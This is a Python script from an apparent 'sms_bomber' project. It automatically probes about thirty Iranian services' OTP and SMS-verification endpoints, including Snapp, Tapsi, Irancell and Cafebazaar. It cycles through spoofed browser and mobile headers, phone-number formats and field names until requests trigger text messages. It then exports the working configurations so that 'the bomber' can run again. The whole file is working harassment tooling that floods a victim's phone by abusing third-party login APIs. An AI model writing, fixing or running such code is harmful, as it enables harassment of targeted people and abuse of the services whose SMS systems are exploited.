#!/usr/bin/env python3
"""
Provider Auto-Fixer Tool
Automatically finds correct configurations for failing providers.
"""

import asyncio
import aiohttp
import json
import sys
import os
import re
from typing import Dict, Any, Optional, List, Tuple
from dataclasses import dataclass, asdict
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from sms_bomber.api.providers import Provider

console = Console()


@dataclass
class FixedProvider:
    """A provider with working configuration."""
    name: str
    url: str
    data_template: Dict[str, Any]
    headers: Dict[str, str]
    method: str = "POST"
    content_type: str = "json"  # json or form


class ProviderAutoFixer:
    """Automatically fix SMS providers by trying different configurations."""

    def __init__(self):
        self.timeout = aiohttp.ClientTimeout(total=8)
        
        # Phone number formats to try
        self.phone_formats = {
            "original": lambda p: p,                          # 09123456789
            "no_zero": lambda p: p[1:] if p.startswith("0") else p,  # 9123456789
            "plus98": lambda p: f"+98{p[1:]}" if p.startswith("0") else f"+98{p}",  # +989123456789
            "98": lambda p: f"98{p[1:]}" if p.startswith("0") else f"98{p}",        # 989123456789
            "zero98": lambda p: f"098{p[1:]}" if p.startswith("0") else f"0{p}",    # 0989123456789
        }
        
        # Field names to try
        self.field_names = [
            "phone", "mobile", "phoneNumber", "phone_number", 
            "msisdn", "cellphone", "tel", "username", "contact",
            "PhoneNumber", "Mobile", "mobileNumber", "cell"
        ]
        
        # Header configurations
        self.header_configs = {
            "json_browser": {
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "fa-IR,fa;q=0.9,en;q=0.8",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
            },
            "json_mobile": {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "User-Agent": "okhttp/4.9.0",
                "Accept-Encoding": "gzip",
            },
            "form_browser": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            },
            "json_api": {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "User-Agent": "PostmanRuntime/7.32.3",
            },
        }

    async def test_configuration(
        self,
        url: str,
        data: Dict[str, Any],
        headers: Dict[str, str],
        use_form: bool = False
    ) -> Tuple[bool, int, str]:
        """Test a specific configuration."""
        try:
            # Add dynamic origin/referer
            headers = headers.copy()
            from urllib.parse import urlparse
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            headers["Origin"] = base_url
            headers["Referer"] = base_url + "/"
            
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                if use_form:
                    async with session.post(url, data=data, headers=headers, ssl=False) as response:
                        body = await response.text()
                        success = self._is_success(response.status, body)
                        return success, response.status, body[:200]
                else:
                    async with session.post(url, json=data, headers=headers, ssl=False) as response:
                        body = await response.text()
                        success = self._is_success(response.status, body)
                        return success, response.status, body[:200]
                        
        except Exception as e:
            return False, 0, str(e)

    def _is_success(self, status: int, body: str) -> bool:
        """Check if the request was successful."""
        body_lower = body.lower()
        
        # Clear success indicators
        if status in [200, 201, 202]:
            # Check for positive indicators
            if any(kw in body_lower for kw in ['success', 'ok', 'sent', 'otp', 'code', 'verify']):
                return True
            # Check for "soft success" (user exists, etc.)
            if any(kw in body_lower for kw in ['exist', 'already', 'registered', 'found']):
                return True
            # If 200 and no error indicators, probably success
            if not any(kw in body_lower for kw in ['error', 'fail', 'invalid', 'wrong']):
                return True
        
        # Some APIs return 400 but still send SMS (validation error but OTP sent)
        if status == 400:
            if any(kw in body_lower for kw in ['sent', 'otp', 'code', 'verify']):
                return True
        
        return False

    async def find_working_config(
        self,
        name: str,
        url: str,
        phone: str,
        max_attempts: int = 50
    ) -> Optional[FixedProvider]:
        """Try different configurations to find one that works."""
        
        attempts = 0
        
        # Try each combination
        for header_name, headers in self.header_configs.items():
            use_form = "form" in header_name
            
            for field_name in self.field_names:
                for phone_format_name, phone_formatter in self.phone_formats.items():
                    if attempts >= max_attempts:
                        return None
                    
                    attempts += 1
                    formatted_phone = phone_formatter(phone)
                    data = {field_name: formatted_phone}
                    
                    success, status, body = await self.test_configuration(
                        url, data, headers, use_form
                    )
                    
                    if success:
                        console.print(f"[green]✅ Found working config![/green]")
                        console.print(f"   Headers: {header_name}")
                        console.print(f"   Field: {field_name}")
                        console.print(f"   Phone format: {phone_format_name}")
                        
                        # Create the data template
                        if phone_format_name == "original":
                            template_value = "{phone}"
                        elif phone_format_name == "no_zero":
                            template_value = "{phone[1:]}"
                        elif phone_format_name == "plus98":
                            template_value = "+98{phone[1:]}"
                        elif phone_format_name == "98":
                            template_value = "98{phone[1:]}"
                        else:
                            template_value = "{phone}"
                        
                        return FixedProvider(
                            name=name,
                            url=url,
                            data_template={field_name: template_value},
                            headers=headers,
                            method="POST",
                            content_type="form" if use_form else "json"
                        )
        
        return None

    async def fix_providers_batch(
        self,
        providers: List[Dict[str, str]],
        phone: str
    ) -> List[FixedProvider]:
        """Fix multiple providers."""
        
        fixed = []
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            task = progress.add_task("Fixing providers...", total=len(providers))
            
            for provider in providers:
                name = provider.get("name", "Unknown")
                url = provider.get("url", "")
                
                progress.update(task, description=f"Fixing {name}...")
                
                result = await self.find_working_config(name, url, phone, max_attempts=30)
                
                if result:
                    fixed.append(result)
                    console.print(f"[green]✅ {name}[/green]")
                else:
                    console.print(f"[red]❌ {name}[/red]")
                
                progress.advance(task)
                
                # Small delay to avoid rate limiting
                await asyncio.sleep(0.5)
        
        return fixed


def export_fixed_providers(providers: List[FixedProvider], output_file: str):
    """Export fixed providers to a Python file."""
    
    code = '''# Auto-fixed providers
# Generated by Provider Auto-Fixer

from sms_bomber.api.providers import Provider

FIXED_PROVIDERS = [
'''
    
    for p in providers:
        code += f'''    Provider(
        name="{p.name}",
        url="{p.url}",
        data_template={p.data_template},
    ),
'''
    
    code += ''']

# Custom headers for these providers (use in client)
PROVIDER_HEADERS = {
'''
    
    for p in providers:
        code += f'''    "{p.name}": {p.headers},
'''
    
    code += '}\n'
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(code)
    
    console.print(f"[green]✅ Exported to {output_file}[/green]")


async def main():
    """Main function."""
    console.print(Panel.fit(
        "[bold cyan]🔧 Provider Auto-Fixer[/bold cyan]\n"
        "Automatically finds working configurations",
        border_style="cyan"
    ))
    
    # Get phone number
    if len(sys.argv) > 1:
        phone = sys.argv[1]
    else:
        phone = console.input("\n📱 Enter test phone number: ")
    
    # List of providers to fix (the failing ones)
    failing_providers = [
        {"name": "Snapp V1", "url": "https://api.snapp.ir/api/v1/sms/link"},
        {"name": "Snapp V2", "url": "https://digitalsignup.snapp.ir/ds3/api/v3/otp"},
        {"name": "Achareh", "url": "https://api.achareh.co/v2/accounts/login/"},
        {"name": "Banimode", "url": "https://mobapi.banimode.com/api/v2/auth/request"},
        {"name": "Classino", "url": "https://student.classino.com/otp/v1/api/login"},
        {"name": "SMS.ir", "url": "https://appapi.sms.ir/api/app/auth/sign-up/verification-code"},
        {"name": "Bikoplus", "url": "https://bikoplus.com/account/check-phone-number"},
        {"name": "Mootanroo", "url": "https://api.mootanroo.com/api/v3/auth/send-otp"},
        {"name": "Tap33", "url": "https://tap33.me/api/v2/user"},
        {"name": "Tapsi", "url": "https://api.tapsi.ir/api/v2.2/user"},
        {"name": "IToll", "url": "https://app.itoll.com/api/v1/auth/login"},
        {"name": "Anargift", "url": "https://api.anargift.com/api/v1/auth/auth"},
        {"name": "Abantether", "url": "https://abantether.com/users/register/phone/send/"},
        {"name": "OKCS", "url": "https://my.okcs.com/api/check-mobile"},
        {"name": "Tebinja", "url": "https://www.tebinja.com/api/v1/users"},
        {"name": "Bit24", "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile"},
        {"name": "Delino", "url": "https://www.delino.com/en/user/register"},
        {"name": "Miare", "url": "https://www.miare.ir/api/otp/driver/request/"},
        {"name": "Dosma", "url": "https://app.dosma.ir/api/v1/account/send-otp/"},
        {"name": "Ostadkr", "url": "https://api.ostadkr.com/login"},
        {"name": "Sibbazar", "url": "https://sandbox.sibbazar.com/api/v1/user/invite"},
        {"name": "Shab", "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile"},
        {"name": "Bitpin", "url": "https://api.bitpin.org/v2/usr/signin/"},
        {"name": "Cafebazaar", "url": "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"},
        {"name": "Emtiyaz", "url": "https://api.emtiyaz.app/v1/auth/login"},
        {"name": "Torob", "url": "https://api.torob.com/v4/user/phone/send-pin/"},
        {"name": "Basalam", "url": "https://api.basalam.com/v1/users/phone/otp/"},
        {"name": "Filmnet", "url": "https://api-v2.filmnet.ir/api/v1/user/login/"},
        {"name": "Irancell", "url": "https://my.irancell.ir/api/auth/send-otp"},
        {"name": "Hamkaran", "url": "https://app.hamkaran.com/api/v1/auth/request-otp"},
    ]
    
    console.print(f"\n[bold]Attempting to fix {len(failing_providers)} providers...[/bold]")
    console.print("[dim]This will try different configurations to find working ones[/dim]\n")
    
    fixer = ProviderAutoFixer()
    fixed = await fixer.fix_providers_batch(failing_providers, phone)
    
    # Summary
    console.print(f"\n{'='*50}")
    console.print(f"[bold green]✅ Fixed {len(fixed)}/{len(failing_providers)} providers![/bold green]")
    
    if fixed:
        # Show fixed providers
        table = Table(title="Fixed Providers")
        table.add_column("Name", style="cyan")
        table.add_column("Field", style="green")
        table.add_column("Content-Type", style="yellow")
        
        for p in fixed:
            field = list(p.data_template.keys())[0]
            table.add_row(p.name, field, p.content_type)
        
        console.print(table)
        
        # Export
        export_fixed_providers(fixed, "data/fixed_providers.py")
        
        console.print("\n[bold]To use these fixed providers:[/bold]")
        console.print("  1. Copy the providers from data/fixed_providers.py")
        console.print("  2. Replace entries in sms_bomber/api/providers.py")
        console.print("  3. Run the bomber again")


if __name__ == "__main__":
    asyncio.run(main())
